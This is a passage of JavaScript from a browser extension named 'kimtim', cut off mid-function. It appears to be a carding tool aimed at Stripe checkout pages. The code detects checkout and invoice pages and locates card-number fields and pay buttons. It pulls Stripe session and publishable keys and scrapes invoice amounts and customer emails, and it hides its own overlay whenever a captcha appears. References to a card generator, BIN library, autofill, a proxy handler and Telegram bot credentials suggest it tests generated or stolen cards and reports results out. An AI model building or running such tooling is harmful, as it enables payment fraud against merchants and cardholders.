
(function () {
  'use strict';

  // Unified key reference (available because storage module loads first)
  var K = window.kimtimKeys || {};
  const TG_BOT_TOKEN_KEY = K.TG_BOT_TOKEN || 'kimtim_tg_bot_token';
  const TG_CHAT_ID_KEY = K.TG_CHAT_ID || 'kimtim_tg_chat_id';

  let isDashboardActive = false;

  const REQUIRED_MODULES = {
    'storage.js': () => window.__kimtim_STORAGE_LOADED === true && typeof window.kimtimStorage !== 'undefined',
    'autofill.js': () => window.__kimtim_AUTOFILL_LOADED === true && typeof window.kimtimAutofill !== 'undefined',
    'proxyhandler.js': () => window.__kimtim_PROXY_LOADED === true && typeof window.kimtimProxy !== 'undefined',
    'binlibrary.js': () => window.__kimtim_BINLIBRARY_LOADED === true && typeof window.kimtimBinLibrary !== 'undefined'
  };

  function verifyModules() {
    const missingModules = [];
    const loadedModules = [];

    for (const [moduleName, checkFn] of Object.entries(REQUIRED_MODULES)) {
      try {
        if (checkFn()) {
          loadedModules.push(moduleName);
        } else {
          missingModules.push(moduleName);
        }
      } catch (e) {
        missingModules.push(moduleName);
      }
    }

    return { missingModules, loadedModules };
  }

  function showMissingFilesError(missingModules) {
    const existing = document.getElementById('kimtim-file-error-overlay');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.id = 'kimtim-file-error-overlay';
    overlay.className = 'kimtim-error-overlay';

    const content = document.createElement('div');
    content.className = 'kimtim-error-content';

    const header = document.createElement('div');
    header.className = 'kimtim-error-header';
    header.textContent = '⚠️ kimtim - File Error';

    const body = document.createElement('div');
    body.className = 'kimtim-error-body';

    const msg = document.createElement('p');
    msg.className = 'kimtim-error-msg';
    msg.textContent = 'Extension files are missing or corrupted. Please reinstall the extension.';

    const missingBox = document.createElement('div');
    missingBox.className = 'kimtim-error-missing';

    const missingTitle = document.createElement('div');
    missingTitle.className = 'kimtim-error-title';
    missingTitle.textContent = 'Missing Files:';
    missingBox.appendChild(missingTitle);

    missingModules.forEach(m => {
      const item = document.createElement('div');
      item.className = 'kimtim-error-item';
      item.innerHTML = '<span class="kimtim-error-x">✗</span> ' + m;
      missingBox.appendChild(item);
    });

    const fixBox = document.createElement('div');
    fixBox.className = 'kimtim-error-fix';

    const fixTitle = document.createElement('div');
    fixTitle.className = 'kimtim-error-title kimtim-error-title-green';
    fixTitle.textContent = 'How to fix:';
    fixBox.appendChild(fixTitle);

    const fixList = document.createElement('ol');
    fixList.className = 'kimtim-error-list';
    ['Remove the current extension', 'Download the latest kimtim package', 'Load the extension again in Chrome'].forEach(step => {
      const li = document.createElement('li');
      li.textContent = step;
      fixList.appendChild(li);
    });
    fixBox.appendChild(fixList);

    body.appendChild(msg);
    body.appendChild(missingBox);
    body.appendChild(fixBox);
    content.appendChild(header);
    content.appendChild(body);
    overlay.appendChild(content);

    document.body.appendChild(overlay);
  }

  const { missingModules, loadedModules } = verifyModules();

  if (missingModules.length > 0) {
    if (document.body) {
      showMissingFilesError(missingModules);
    } else {
      document.addEventListener('DOMContentLoaded', () => showMissingFilesError(missingModules));
    }
    window.__kimtimBlocked = true;
    return;
  }

  window.__kimtimVerified = true;
})();

if (window.__kimtimBlocked) {
} else if (window.__kimtimLoaded) {
} else {
  window.__kimtimLoaded = true
  var K = window.kimtimKeys || {};
  let isDashboardActive = false;
  let isCaptchaVisible = false;
  let isRestoringAfterCaptcha = false;
  let wasAutoHiddenByCaptcha = false;
  let dashboardStateBeforeCaptcha = null;
  const excludedClasses = [
    'card-generator-overlay', 'kimtim-page-watermark', 'success-toast',
    'success-toast-content', 'success-toast-text', 'success-toast-title',
    'success-toast-details', 'success-ripple-container', 'success-ripple-ring',
    'success-check', 'warning-toast', 'card-toast', 'cc-modal', 'snowfall-container',
    'celebration-container', 'color-ball-container', 'bin-input-row',
    'panel-header', 'panel-body', 'panel-title', 'update-screen',
    'color-ball', 'snowflake', 'sparkle', 'section', 'section-divider',
    'action-btn', 'primary-btn', 'collapsible-section', 'collapsible-header',
    'collapsible-content', 'mode-toggle', 'mode-option', 'header-controls',
    'panel-header-content', 'minimize-btn', 'music-toggle',
    'kimtim-bottom-ip-bar', 'ip-bar-row', 'ip-bar-label', 'ip-bar-value', 'ip-bar-divider',
    'ipbar-user-section', 'ipbar-pfp-wrap', 'ipbar-pfp', 'ipbar-pfp-fallback',
    'ipbar-user-meta', 'ipbar-username', 'ipbar-stats', 'ipbar-ip-section',
    'ipbar-status-dot', 'ipbar-ip-label', 'ipbar-ip-value', 'ipbar-divider'
  ];
  const excludedContainerSelectors = [
    '.card-generator-overlay', '.kimtim-page-watermark', '.success-toast',
    '.success-toast-content', '.success-toast-text',
    '.warning-toast', '.card-toast', '.cc-modal', '.snowfall-container',
    '.celebration-container', '.color-ball-container', '.section',
    '.section-divider', '.collapsible-section', '.kimtim-bottom-ip-bar',
    '[class*="hcaptcha"]', '[class*="h-captcha"]', '[class*="captcha"]',
    '[class*="Captcha"]', '[class*="challenge"]', '[class*="Challenge"]',
    '[class*="modal"]', '[class*="Modal"]', '[class*="overlay"]', '[class*="Overlay"]',
    '[role="dialog"]', '[role="alertdialog"]',
    '[class*="PaymentMethod"]', '[class*="payment-method"]', '[class*="paymentMethod"]',
    '[class*="PaymentOptions"]', '[class*="payment-options"]',
    '[class*="WalletOptions"]', '[class*="wallet-options"]',
    '[role="radiogroup"]', '[role="tablist"]'
  ];
  function isExcludedElement(el) {
    if (!el || !el.classList) return false;
    if (el.closest && el.closest('.card-generator-overlay')) return true;
    if (el.closest && el.closest('.success-toast')) return true;
    if (el.closest && el.closest('.warning-toast')) return true;
    if (el.closest && el.closest('.card-toast')) return true;
    if (el.closest && el.closest('.kimtim-bottom-ip-bar')) return true;
    if (el.closest && el.closest('.bin-recommend-popup')) return true;
    if (el.closest && el.closest('.bin-notification')) return true;
    if (el.closest && el.closest('#kimtim-bin-recommend')) return true;
    if (el.closest && el.closest('#kimtim-bin-notification')) return true;
    if (el.closest && el.closest('.cc-modal')) return true;
    if (el.closest && (
      el.closest('[data-hcaptcha]') ||
      el.closest('[class*="hcaptcha"]') ||
      el.closest('[class*="h-captcha"]') ||
      el.closest('[id*="hcaptcha"]') ||
      el.closest('[id*="h-captcha"]') ||
      el.closest('iframe[src*="hcaptcha"]') ||
      el.closest('[class*="captcha"]') ||
      el.closest('[class*="Captcha"]') ||
      el.closest('[class*="challenge"]') ||
      el.closest('[class*="Challenge"]')
    )) return true;
    for (const cls of excludedClasses) {
      if (el.classList.contains(cls)) return true;
    }
    if (el.id && el.id.includes('kimtim')) return true;
    if (el.id && (el.id.includes('hcaptcha') || el.id.includes('captcha'))) return true;
    if (el.closest) {
      for (const selector of excludedContainerSelectors) {
        if (el.closest(selector)) return true;
      }
    }
    return false;
  }
  function addSmoothTransition(el) {
    try {
      const currentTransition = el.style.transition || '';
      if (!currentTransition.includes('background')) {
        el.style.transition = currentTransition ?
          currentTransition + ', background-color 0.3s ease' :
          'background-color 0.3s ease';
      }
    } catch (e) { }
  }
  function removeSmoothTransition(el) {
    try {
      setTimeout(() => {
        const currentTransition = el.style.transition || '';
        el.style.transition = currentTransition.replace(/,?\s*background-color\s*[\d.]*s?\s*ease/g, '').trim();
      }, 350);
    } catch (e) { }
  }
  function checkCaptchaVisible() {
    try {

      const captchaIframes = document.querySelectorAll(
        'iframe[src*="hcaptcha"], iframe[src*="captcha"], iframe[src*="challenge"], ' +
        'iframe[data-hcaptcha], iframe[title*="hCaptcha"], iframe[title*="captcha"], ' +
        'iframe[title*="challenge"], iframe[title*="verification"], ' +
        'iframe[src*="recaptcha"], iframe[src*="turnstile"], iframe[src*="arkoselabs"]'
      );
      for (const iframe of captchaIframes) {
        try {
          const rect = iframe.getBoundingClientRect();
          const style = window.getComputedStyle(iframe);
          if (rect.width > 0 && rect.height > 0 &&
            style.display !== 'none' && style.visibility !== 'hidden' &&
            style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }

      const captchaContainers = document.querySelectorAll(
        '[class*="hcaptcha"], [class*="h-captcha"], [id*="hcaptcha"], [id*="h-captcha"], ' +
        '[data-hcaptcha], [class*="captcha-container"], [class*="captcha-overlay"], ' +
        '[class*="challenge-container"], [class*="ChallengeContainer"], ' +
        '[class*="recaptcha"], [class*="turnstile"], [class*="cf-turnstile"], ' +
        '[class*="captcha-modal"], [class*="CaptchaModal"], [class*="captcha_modal"], ' +
        '[class*="verification-modal"], [class*="VerificationModal"]'
      );
      for (const container of captchaContainers) {
        try {
          const rect = container.getBoundingClientRect();
          const style = window.getComputedStyle(container);
          if (rect.width > 50 && rect.height > 50 &&
            style.display !== 'none' && style.visibility !== 'hidden' &&
            style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }

      const fullScreenOverlays = document.querySelectorAll(
        '[class*="challenge-overlay"], [class*="Challenge-overlay"], ' +
        '[class*="security-challenge"], [class*="SecurityChallenge"]'
      );
      for (const overlay of fullScreenOverlays) {
        try {
          const rect = overlay.getBoundingClientRect();
          const style = window.getComputedStyle(overlay);
          if (rect.width > window.innerWidth * 0.5 && rect.height > window.innerHeight * 0.3 &&
            style.display !== 'none' && style.visibility !== 'hidden' &&
            style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }
      return false;
    } catch (e) {
      return false;
    }
  }
  const preserveOriginalSelectors = [
    '[class*="BrandIcon"]', '[class*="CardBrand"]', '[class*="brand-icon"]',
    '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]', '.Button--primary',
    '[data-testid="hosted-payment-submit-button"]',
    '[class*="cvc"]', '[class*="Cvc"]', '[class*="cvv"]', '[class*="SecurityCode"]',
    '[class*="Link"]', '[class*="link-button"]', '[class*="LinkButton"]',
    '[class*="PaymentMethod"]', '[class*="payment-method"]', '[class*="paymentMethod"]',
    '[class*="Tab"]', '[class*="tab"]', 'button[role="tab"]',
    '[class*="Radio"]', '[class*="radio"]', 'input[type="radio"]',
    '[class*="Wallet"]', '[class*="wallet"]',
    '[class*="Icon"]', '[class*="icon"]', '[class*="Logo"]', '[class*="logo"]',
    'svg', '[role="img"]',
    'input', 'select', '.Input', '[class*="Input"]',
    'footer', '.Footer', '[class*="Footer"]', '[class*="footer"]',
    'iframe',
    '[class*="FormFieldGroup"]', '[class*="form-field"]', '[class*="FormField"]',
    '[class*="CheckoutForm"]', '[class*="checkout-form"]', '[class*="PaymentForm"]',
    '[class*="ContactInformation"]', '[class*="contact-information"]',
    '[class*="BillingAddress"]', '[class*="billing-address"]',
    '[class*="ShippingAddress"]', '[class*="shipping-address"]',
    '[class*="CardElement"]', '[class*="card-element"]',
    '[class*="ElementsApp"]', '[class*="elements-app"]',
    '[class*="CheckoutPaymentForm"]', '[class*="PaymentMethodSelector"]',
    '[class*="AccordionItem"]', '[class*="accordion"]',
    '[class*="Fieldset"]', '[class*="fieldset"]',
    '[class*="FormRow"]', '[class*="form-row"]',
    '[class*="TextField"]', '[class*="text-field"]',
    '[class*="SelectField"]', '[class*="select-field"]',
    '[class*="Checkbox"]', '[class*="checkbox"]',
    'label', '[class*="Label"]',
    '[class*="TermsText"]', '[class*="terms"]',
    '[class*="ReadOnlyFormField"]', '[class*="read-only"]',
    '[class*="SavedPaymentMethod"]', '[class*="saved-payment"]'
  ];
  function isDesktop() {
    return window.innerWidth > 768;
  }

  function getDeviceType() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    const hasTouch = 'ontouchstart' in window ||
      navigator.maxTouchPoints > 0 ||
      navigator.msMaxTouchPoints > 0;

    const hasCoarsePointer = window.matchMedia && window.matchMedia('(pointer: coarse)').matches;

    const canHover = window.matchMedia && window.matchMedia('(hover: hover)').matches;

    const uaIsiOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
    const uaIsAndroid = /android/i.test(userAgent);
    const uaIsMobile = /Mobi|Mobile|webOS|BlackBerry|Opera Mini|IEMobile/i.test(userAgent);

    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const devicePixelRatio = window.devicePixelRatio || 1;
    const smallScreen = Math.min(screenWidth, screenHeight) <= 768;

    const hasOrientationType = screen.orientation && screen.orientation.type;

    if (uaIsiOS) {
      return 'ios';
    }

    if (hasTouch && hasCoarsePointer && !canHover) {
      if (uaIsAndroid) {
        return /mobile/i.test(userAgent) ? 'android_phone' : 'android_tablet';
      }
      return 'mobile';
    }

    if (hasTouch && smallScreen && devicePixelRatio >= 2) {
      if (uaIsAndroid) {
        return 'android_phone';
      }
      return 'mobile';
    }

    if (hasTouch && hasCoarsePointer) {
      return 'mobile';
    }

    if (uaIsAndroid) {
      return /mobile/i.test(userAgent) ? 'android_phone' : 'android_tablet';
    }

    if (uaIsMobile) {
      return 'mobile';
    }

    if (hasTouch && smallScreen) {
      return 'mobile';
    }

    return 'desktop';
  }

  function isMobileDevice() {
    const deviceType = getDeviceType();
    return ['ios', 'android_phone', 'android_tablet', 'mobile'].includes(deviceType);
  }

  function isIOSDevice() {
    const userAgent = navigator.userAgent || '';
    return /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
  }

  function isDesktopDevice() {
    return getDeviceType() === 'desktop';
  }

  function isTouchDevice() {
    return 'ontouchstart' in window ||
      navigator.maxTouchPoints > 0 ||
      navigator.msMaxTouchPoints > 0;
  }

  function shouldApplyBackgroundColor() {
    return isMobileDevice() || (isTouchDevice() && window.matchMedia('(pointer: coarse)').matches);
  }

  const desktopPreserveSelectors = [
    '[class*="RightPanel"]', '[class*="right-panel"]', '[class*="rightPanel"]',
    '[class*="FormContainer"]', '[class*="form-container"]',
    '[class*="PaymentElement"]', '[class*="payment-element"]',
    '[class*="CheckoutRightColumn"]', '[class*="checkout-right"]',
    '[class*="OrderForm"]', '[class*="order-form"]',
    '[class*="CheckoutContent"]', '[class*="checkout-content"]',
    '[class*="MainContent"]', '[class*="main-content"]',
    '[class*="FormSection"]', '[class*="form-section"]',
    '[class*="CheckoutMain"]', '[class*="checkout-main"]',
    '[class*="PaymentSection"]', '[class*="payment-section"]',
    '[class*="ContactSection"]', '[class*="contact-section"]',
    '[class*="App-Payment"]', '[class*="app-payment"]',
    '[class*="StripeElement"]', '[class*="stripe-element"]'
  ];
  function shouldPreserveElement(el) {
    if (!el) return false;
    for (const selector of preserveOriginalSelectors) {
      try {
        if (el.matches && el.matches(selector)) return true;
        if (el.closest && el.closest(selector)) return true;
      } catch (e) { }
    }
    if (isDesktop()) {
      for (const selector of desktopPreserveSelectors) {
        try {
          if (el.matches && el.matches(selector)) return true;
          if (el.closest && el.closest(selector)) return true;
        } catch (e) { }
      }
    }
    return false;
  }

  const RANDOM_BG_COLORS = [
    "#0d9488", "#0f766e", "#115e59", "#134e4a", "#14b8a6",
    "#0e7490", "#155e75", "#164e63", "#047857", "#065f46"
  ];

  const DEFAULT_BG_COLOR = "#0f766e";
  let pageBackgroundColor = DEFAULT_BG_COLOR;
  let bgColorEnabled = false;
  let hasCustomColor = false;
  let sessionRandomColor = null;

  function getRandomBgColor() {
    const randomIndex = Math.floor(Math.random() * RANDOM_BG_COLORS.length);
    return RANDOM_BG_COLORS[randomIndex];
  }

  function loadBgColorSetting() {
    return new Promise((resolve) => {
      const savedEnabled = localStorage.getItem(K.BG_ENABLED);
      const savedColor = localStorage.getItem(K.PAGE_BG_COLOR);
      const savedHasCustom = localStorage.getItem(K.PAGE_HAS_CUSTOM);

      bgColorEnabled = savedEnabled === "true";
      hasCustomColor = savedHasCustom === "true";

      if (hasCustomColor && savedColor) {

        pageBackgroundColor = savedColor;
      } else if (bgColorEnabled) {

        sessionRandomColor = getRandomBgColor();
        pageBackgroundColor = sessionRandomColor;
      }
      resolve();
    });
  }

  function saveBgColorSetting(enabled, color, isCustom = false) {
    bgColorEnabled = enabled;
    hasCustomColor = isCustom;

    localStorage.setItem(K.BG_ENABLED, enabled ? "true" : "false");
    localStorage.setItem(K.PAGE_HAS_CUSTOM, isCustom ? "true" : "false");

    if (isCustom) {
      pageBackgroundColor = color;
      localStorage.setItem(K.PAGE_BG_COLOR, color);
    }

    var bgData = {};
    bgData[K.BG_ENABLED] = enabled;
    bgData[K.PAGE_BG_COLOR] = isCustom ? color : "";
    bgData[K.PAGE_HAS_CUSTOM] = isCustom;
    window.postMessage({
      type: 'kimtim_STORAGE_REQUEST',
      requestId: 'bg_' + Date.now(),
      action: 'SET',
      data: bgData
    }, '*');
  }

  loadBgColorSetting().then(() => {
    if (bgColorEnabled && typeof applyCustomStyles === 'function') {
      applyCustomStyles();
    }
  });

  function isInPaymentFormArea(el) {
    if (!el) return false;
    const paymentFormSelectors = [
      '[class*="RightPanelContent"]', '[class*="rightPanelContent"]',
      '[class*="App-Payment"]', '[class*="PaymentFormContainer"]',
      '[class*="CheckoutPaymentForm"]', '[class*="PaymentMethodForm"]',
      '[class*="FormFieldGroup"]', '[class*="ContactInformation"]',
      '[class*="BillingAddressForm"]', '[class*="PaymentElement"]',
      '[class*="ElementsApp"]', '[class*="StripeElement"]',
      '[class*="CheckoutForm"]', '[class*="PaymentRequestButton"]',
      '[class*="AccordionItemContent"]', '[class*="FormRow"]',
      '[data-testid*="payment"]', '[data-testid*="checkout"]',
      '[class*="Column--right"]', '[class*="column-right"]',
      '[class*="RightColumn"]', '[class*="right-column"]'
    ];
    for (const selector of paymentFormSelectors) {
      try {
        if (el.closest && el.closest(selector)) return true;
      } catch (e) { }
    }
    if (isDesktop()) {
      try {
        const rect = el.getBoundingClientRect();
        const screenMidpoint = window.innerWidth / 2;
        if (rect.left > screenMidpoint - 100) {
          const computed = window.getComputedStyle(el);
          const bg = computed.backgroundColor;
          if (bg && (bg.includes('255, 255, 255') || bg.includes('250, 250, 250') || bg.includes('248, 248, 248') || bg.includes('245, 245, 245'))) {
            return true;
          }
        }
      } catch (e) { }
    }
    return false;
  }
  let _bgStyleTag = null;
  let _lastAppliedBgColor = null;
  let _bgProcessed = new WeakSet();
  let _bgRafId = null;

  function _ensureBgStyleTag(bgColor) {
    if (_lastAppliedBgColor !== bgColor) {
      _lastAppliedBgColor = bgColor;
      document.documentElement.style.setProperty('background', bgColor, 'important');
      document.documentElement.style.setProperty('background-color', bgColor, 'important');
      document.documentElement.style.setProperty('min-height', '100vh', 'important');
      if (document.body) {
        document.body.style.setProperty('background', bgColor, 'important');
        document.body.style.setProperty('background-color', bgColor, 'important');
        document.body.style.setProperty('min-height', '100vh', 'important');
      }
    }
  }

  function _setBg(el, bgColor) {
    if (_bgProcessed.has(el)) return;
    el.style.setProperty('background', bgColor, 'important');
    el.style.setProperty('background-color', bgColor, 'important');
    _bgProcessed.add(el);
  }

  function applyCustomStyles() {

    if (!bgColorEnabled) {
      return;
    }

    if (!shouldApplyBackgroundColor()) {
      return;
    }

    isCaptchaVisible = checkCaptchaVisible();
    if (isCaptchaVisible) {
      return;
    }

    let bgColor;
    if (hasCustomColor) {
      bgColor = pageBackgroundColor;
    } else {

      if (!sessionRandomColor) {
        sessionRandomColor = getRandomBgColor();
      }
      bgColor = sessionRandomColor;
    }

    if (_lastAppliedBgColor !== bgColor) {
      _bgProcessed = new WeakSet();
    }

    _ensureBgStyleTag(bgColor);

    const onDesktop = isDesktop();

    const allSelectors = onDesktop
      ? '[class*="LeftPanel"], [class*="left-panel"], [class*="leftPanel"], [class*="Column--left"], [class*="LeftColumn"], [class*="ProductSummary"], [class*="OrderSummary"], [class*="product-summary"], [class*="App"], [class*="Page"], [class*="Root"], [class*="Shell"], section, main, article, header, aside, nav, .Divider, [class*="divider"], [class*="Divider"], [class*="ViewDetails"], [class*="details"], [class*="Details"], [class*="OrderDetails"], [class*="order-details"], [class*="Summary"], [class*="summary"], [class*="PaymentDetails"], [class*="payment-details"], [class*="LineItem"], [class*="line-item"], [class*="OrderSummary"], [class*="order-summary"], [class*="ProductDetails"], [class*="product-details"]'
      : '[class*="App"], [class*="app"], [class*="Page"], [class*="page"], [class*="Container"], [class*="container"], [class*="Wrapper"], [class*="wrapper"], [class*="Layout"], [class*="layout"], [class*="Content"], [class*="content"], [class*="Main"], [class*="Body"], [class*="body"], [class*="Root"], [class*="root"], [class*="Shell"], [class*="shell"], [class*="Frame"], [class*="frame"], [class*="View"], [class*="view"], [class*="Panel"], [class*="panel"], [class*="Section"], [class*="section"], [class*="Block"], [class*="block"], [class*="Region"], [class*="region"], [class*="Area"], [class*="area"], [class*="Zone"], [class*="zone"], [class*="Checkout"], [class*="checkout"], [class*="Payment"], [class*="Stripe"], [class*="stripe"], section, main, article, header, aside, nav, .Divider, [class*="divider"], [class*="Divider"], [class*="ViewDetails"], [class*="details"], [class*="Details"], [class*="OrderDetails"], [class*="order-details"], [class*="Summary"], [class*="summary"], [class*="PaymentDetails"], [class*="payment-details"], [class*="LineItem"], [class*="line-item"], [class*="OrderSummary"], [class*="order-summary"], [class*="ProductDetails"], [class*="product-details"]';

    document.querySelectorAll(allSelectors).forEach(el => {
      if (!isExcludedElement(el) && !shouldPreserveElement(el) && (!onDesktop || !isInPaymentFormArea(el))) {
        _setBg(el, bgColor);
      }
    });

    if (onDesktop) {
      const divs = document.getElementsByTagName('div');
      for (let i = 0, len = divs.length; i < len; i++) {
        const el = divs[i];
        if (_bgProcessed.has(el)) continue;
        if (isExcludedElement(el) || shouldPreserveElement(el) || isInPaymentFormArea(el)) continue;
        const classes = el.className || '';
        if (typeof classes === 'string' && (classes.includes('Left') || classes.includes('left') || classes.includes('Product') || classes.includes('product') || classes.includes('Order') || classes.includes('order') || classes.includes('Summary') || classes.includes('summary'))) {
          _setBg(el, bgColor);
        }
      }
    } else {
      const divs = document.getElementsByTagName('div');
      for (let i = 0, len = divs.length; i < len; i++) {
        const el = divs[i];
        if (_bgProcessed.has(el)) continue;
        if (isExcludedElement(el) || shouldPreserveElement(el)) continue;
        _setBg(el, bgColor);
      }
    }

    if (!onDesktop) {
      if (_bgRafId) cancelAnimationFrame(_bgRafId);
      _bgRafId = requestAnimationFrame(() => {
        const tags = ['span', 'p', 'li', 'ul', 'ol', 'dl', 'table', 'tr', 'td', 'th', 'form', 'fieldset', 'figure', 'figcaption', 'footer'];
        for (let t = 0; t < tags.length; t++) {
          const els = document.getElementsByTagName(tags[t]);
          for (let i = 0, len = els.length; i < len; i++) {
            const el = els[i];
            if (_bgProcessed.has(el)) continue;
            if (isExcludedElement(el) || shouldPreserveElement(el)) continue;
            _setBg(el, bgColor);
          }
        }
        _bgRafId = null;
      });
    }
  }

  let lastCaptchaState = false;
  setInterval(() => {
    if (!isDashboardActive) return;

    const currentCaptchaVisible = checkCaptchaVisible();

    if (currentCaptchaVisible !== lastCaptchaState) {
      lastCaptchaState = currentCaptchaVisible;
      isCaptchaVisible = currentCaptchaVisible;

      if (currentCaptchaVisible) {

        if (typeof autoHideDashboardForCaptcha === 'function') {
          autoHideDashboardForCaptcha();
        }
      } else {

        if (typeof restoreDashboardAfterCaptcha === 'function') {
          restoreDashboardAfterCaptcha();
        }
      }
    }

    if (!bgColorEnabled) return;
    if (isCaptchaVisible) {
      return;
    }
    const expectedBg = pageBackgroundColor || DEFAULT_BG_COLOR;
    const bodyBg = window.getComputedStyle(document.body).backgroundColor;
    const htmlBg = window.getComputedStyle(document.documentElement).backgroundColor;
    if (bodyBg === 'rgba(0, 0, 0, 0)' || bodyBg === 'transparent' ||
      htmlBg === 'rgba(0, 0, 0, 0)' || htmlBg === 'transparent' ||
      bodyBg.includes('255, 255, 255') || htmlBg.includes('255, 255, 255')) {
      applyCustomStyles();
    }
  }, 300);
  let styleTimeout = null;
  let isApplyingStyles = false;
  function debouncedApplyStyles() {
    if (!isDashboardActive) return;
    if (!bgColorEnabled) return;
    if (isApplyingStyles) return;
    if (isCaptchaVisible) return;
    if (styleTimeout) clearTimeout(styleTimeout);
    styleTimeout = setTimeout(() => {
      if (!isDashboardActive) return;
      if (checkCaptchaVisible()) {
        isCaptchaVisible = true;
        return;
      }
      isApplyingStyles = true;
      applyCustomStyles();
      isApplyingStyles = false;
    }, 50);
  }
  const styleObserver = new MutationObserver((mutations) => {
    const captchaAdded = mutations.some(m => {
      return Array.from(m.addedNodes).some(node => {
        if (node.nodeType === 1) {
          return node.matches && (
            node.matches('[class*="hcaptcha"]') ||
            node.matches('[id*="hcaptcha"]') ||
            node.matches('[data-hcaptcha]') ||
            node.matches('iframe[src*="hcaptcha"]') ||
            node.matches('iframe[src*="captcha"]') ||
            node.matches('[class*="captcha"]') ||
            node.matches('[class*="challenge"]') ||
            node.matches('[class*="Challenge"]') ||
            node.matches('iframe[title*="captcha" i]') ||
            node.matches('iframe[title*="challenge" i]')
          );
        }
        return false;
      });
    });
    if (captchaAdded) {
      isCaptchaVisible = true;

      if (typeof autoHideDashboardForCaptcha === 'function') {
        autoHideDashboardForCaptcha();
      }
      return;
    }
    const captchaRemoved = mutations.some(m => {
      return Array.from(m.removedNodes).some(node => {
        if (node.nodeType === 1) {
          return node.matches && (
            node.matches('[class*="hcaptcha"]') ||
            node.matches('[id*="hcaptcha"]') ||
            node.matches('[data-hcaptcha]') ||
            node.matches('iframe[src*="hcaptcha"]') ||
            node.matches('iframe[src*="captcha"]') ||
            node.matches('[class*="captcha"]') ||
            node.matches('[class*="challenge"]') ||
            node.matches('[class*="Challenge"]') ||
            node.matches('[role="dialog"]')
          );
        }
        return false;
      });
    });
    if (captchaRemoved) {
      setTimeout(() => {
        isCaptchaVisible = checkCaptchaVisible();
        if (!isCaptchaVisible) {
          isRestoringAfterCaptcha = true;
          applyCustomStyles();

          if (typeof restoreDashboardAfterCaptcha === 'function') {
            restoreDashboardAfterCaptcha();
          }
          setTimeout(() => {
            isRestoringAfterCaptcha = false;
          }, 400);
        }
      }, 500);
      return;
    }
    const hasRelevantChanges = mutations.some(m =>
      m.type === 'childList' && m.addedNodes.length > 0
    );
    if (hasRelevantChanges && !isCaptchaVisible) {
      debouncedApplyStyles();
    }
  });
  styleObserver.observe(document.body, { childList: true, subtree: true });
  const CARD_FIELD_SELECTORS = [
    '#cardNumber',
    '[name="cardNumber"]',
    '[name="card-number"]',
    '[name="cardnumber"]',
    '[autocomplete="cc-number"]',
    '[data-elements-stable-field-name="cardNumber"]',
    'input[placeholder*="card number" i]',
    'input[placeholder*="card no" i]',
    'input[aria-label*="card number" i]',
    '#card-number',
    '.card-number',
    '[name="number"]',
    '[name="ccnumber"]',
    '[name="cc-number"]',
    '[data-stripe="number"]',
    'input[name*="cardNumber" i]',
    'input[name*="card_number" i]',
    'input[name*="creditcard" i]',
    'input[id*="cardNumber" i]',
    'input[id*="card-number" i]',
    'input[id*="cc-number" i]'
  ];
  const SUBMIT_BUTTON_SELECTORS = [
    '.SubmitButton',
    '[class*="SubmitButton"]',
    '.SubmitButton-IconContainer',
    '.Button--primary',
    'button[type="submit"]',
    '[data-testid="hosted-payment-submit-button"]',
    '.pay-button',
    '.payment-button',
    'button[class*="pay" i]',
    'button[class*="submit" i]'
  ];
  function hasCardFields() {
    for (const selector of CARD_FIELD_SELECTORS) {
      try {
        const element = document.querySelector(selector);
        if (element) return true;
      } catch (e) { }
    }
    const iframes = document.querySelectorAll('iframe');
    for (const iframe of iframes) {
      try {
        const src = iframe.src || '';
        const name = iframe.name || '';
        const id = iframe.id || '';
        if (src.includes('stripe') || name.includes('card') || id.includes('card') ||
          src.includes('checkout') || src.includes('payment')) {
          return true;
        }
      } catch (e) { }
    }
    return false;
  }
  function hasSubmitButton() {
    for (const selector of SUBMIT_BUTTON_SELECTORS) {
      try {
        const element = document.querySelector(selector);
        if (element) return true;
      } catch (e) { }
    }
    return false;
  }
  function hasStripeSessionInUrl() {
    const url = window.location.href;
    const hostname = window.location.hostname.toLowerCase();
    const pathname = window.location.pathname.toLowerCase();

    const isStripeDomain = hostname.includes('stripe.com') ||
      hostname.includes('checkout.') ||
      hostname.includes('pay.') ||
      hostname.includes('billing.') ||
      hostname.includes('invoice.') ||
      hostname.includes('buy.');

    if (!isStripeDomain) {
      return false;
    }

    if (url.includes('cs_live_') || url.includes('cs_test_')) return true;
    if (pathname.includes('/checkout/session/')) return true;
    if (pathname.includes('/checkout') && isStripeDomain) return true;
    if (url.includes('checkout.stripe.com/c/pay')) return true;
    if (hostname === 'buy.stripe.com') return true;

    return false;
  }
  function hasValidStripeKeys() {
    const csLive = extractCsLive(window.location.href);
    const pkLive = extractPkLive();
    return !!(csLive && pkLive);
  }
  function isInvoiceStripePage() {
    const url = window.location.href;
    return url.includes('invoice.stripe.com') || url.includes('/invoice/');
  }

  let invoiceData = null;

  function extractInvoiceData() {
    if (invoiceData) return invoiceData;

    try {
      const scripts = document.querySelectorAll('script');
      for (const script of scripts) {
        const content = script.textContent || '';

        if (content.includes('"object":"invoice"') || content.includes('"amount_due"')) {
          const jsonMatch = content.match(/\{[\s\S]*"object"\s*:\s*"invoice"[\s\S]*\}/);
          if (jsonMatch) {
            try {
              const data = JSON.parse(jsonMatch[0]);
              if (data.object === 'invoice') {
                invoiceData = {
                  amount: data.amount_due || data.total || 0,
                  currency: data.currency || 'usd',
                  email: data.customer_email || data.customer?.email || '',
                  productName: '',
                  businessUrl: '',
                  voided: data.voided === true
                };

                if (data.lines?.data?.[0]) {
                  const lineItem = data.lines.data[0];
                  invoiceData.productName = lineItem.hosted_invoice_product_name || lineItem.description || '';
                }

                if (data.business_url) {
                  invoiceData.businessUrl = data.business_url;
                }

                return invoiceData;
              }
            } catch (e) { }
          }
        }
      }

      if (window.__STRIPE_INVOICE__) {
        const data = window.__STRIPE_INVOICE__;
        invoiceData = {
          amount: data.amount_due || data.total || 0,
          currency: data.currency || 'usd',
          email: data.customer_email || '',
          productName: data.lines?.data?.[0]?.hosted_invoice_product_name || '',
          businessUrl: data.business_url || '',
          voided: data.voided === true
        };
        return invoiceData;
      }

      const pageText = document.body?.innerText || '';

